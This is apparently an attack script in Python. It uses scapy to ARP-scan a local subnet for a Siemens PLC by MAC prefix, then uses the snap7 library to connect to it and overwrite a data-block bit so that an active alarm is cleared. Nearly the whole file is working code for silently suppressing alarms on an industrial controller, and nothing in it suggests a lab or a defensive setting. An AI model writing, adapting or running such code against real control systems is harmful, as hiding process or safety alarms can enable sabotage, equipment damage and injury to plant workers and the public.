import sys
import time
import struct
import snap7
from snap7.util import *
from scapy.all import ARP, Ether, srp

# Define network settings 
NETWORK_INTERFACE = "Ethernet"  # Change this if needed
PLC_MAC_PREFIX = "00:0E:8C"  # Known prefix for Siemens PLCs (adjust if needed)
TARGET_RACK = 0
TARGET_SLOT = 1

# Scan for the Siemens PLC IP address
def find_plc_ip():
    print("[*] Scanning for the Siemens PLC...")
    request = Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst="192.168.1.1/24")  # Change subnet if needed
    answered, _ = srp(request, timeout=3, verbose=False)

    for sent, received in answered:
        if received.hwsrc.startswith(PLC_MAC_PREFIX):
            print(f"[+] Siemens PLC found at {received.psrc}")
            return received.psrc

    print("[-] No PLC found.")
    sys.exit(1)

# Suppress alarms by modifying the alarm bit
def suppress_alarms(plc_ip):
    print(f"[*] Connecting to PLC at {plc_ip} ...")
    plc = snap7.client.Client()
    plc.connect(plc_ip, TARGET_RACK, TARGET_SLOT)

    if plc.get_connected():
        print("[+] Connected to PLC.")

        # Define DB number and offset (update these for actual system)
        DB_NUMBER = 1  # Configure based on the actual system
        BYTE_INDEX = 0  # Adjust based on actual alarm bit offset
        BIT_INDEX = 0  # Adjust based on actual alarm bit position

        # Read current DB alarm state
        data = plc.db_read(DB_NUMBER, BYTE_INDEX, 1)
        alarm_state = get_bool(data, 0, BIT_INDEX)
        print(f"[*] Current Alarm State: {alarm_state}")

        # Suppress the alarm (set bit to False)
        if alarm_state:  # If alarm is set, reset it
            set_bool(data, 0, BIT_INDEX, False)
            plc.db_write(DB_NUMBER, BYTE_INDEX, data)
            print("[+] Alarm suppressed successfully.")
        else:
            print("[*] No alarm currently active.")

        plc.disconnect()
    else:
        print("[-] Failed to connect to PLC.")

# Main function
if __name__ == "__main__":
    plc_ip = find_plc_ip()
    time.sleep(2)
    suppress_alarms(plc_ip)